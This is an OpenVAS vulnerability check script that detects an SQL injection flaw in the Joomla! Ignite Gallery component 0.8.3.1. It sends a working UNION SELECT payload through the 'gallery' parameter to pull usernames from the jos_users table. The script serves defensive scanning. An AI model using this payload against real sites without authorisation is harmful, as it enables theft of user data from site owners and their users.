##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_ignite_gall_com_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Joomla! Ignite Gallery Component SQL Injection Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2013  SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow the attackers to manipulate SQL queries
  by injecting arbitrary SQL code.
  Impact Level: Application";

tag_affected = "Joomla! Ignite Gallery Component version 0.8.3.1";
tag_insight = "The flaw is due to an input passed via the 'gallery' parameter to
  'index.php' (when 'option' is set to 'com_ignitegallery') is not properly
  sanitised before being used in an SQL query.";
tag_solution = "No solution or patch is available as of 29th January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.ignitegallery.com/";
tag_summary = "This host is installed with Joomla! with Ignite Gallery component
  and is prone to multiple sql injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.903103";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-01-29 14:06:14 +0530 (Tue, 29 Jan 2013)");
  script_name("Joomla! Ignite Gallery Component SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/81055");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/joomla-ignite-gallery-0831-sql-injection");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119278/Joomla-Ignite-Gallery-0.8.3.1-SQL-Injection.html");

  script_description(desc);
  script_summary("Check if Joomla! Ignite Gallery Component is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
if(!joomlaPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:joomlaPort)) exit(0);

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:joomlaPort))exit(0);

## Construct attack request
url = string(dir, "/index.php?option=com_ignitegallery&amp;task=view&amp;" +
             "gallery=-1 union select 1,2,concat(0x6F70656E7661732D73716C2D74657" +
             "374,0x3a,username),4,5,6,7,8,9,10 from jos_users--&amp;Itemid=18&" +
             "amp;3ca3a605131cf698f0c10708dbd5d5f5=b908cde49509d2ec9b39f7e46c90" +
             "88e8&amp;3ca3a605131cf698f0c10708dbd5d5f5=b908cde49509d2ec9b39f7e46c9088e8");

## Check the response to confirm vulnerability
if(http_vuln_check(port:joomlaPort, url:url, check_header:TRUE,
                   pattern:">openvas-sql-test:", extra_check:"[j|J]oomla")){
                   security_hole(joomlaPort);
}
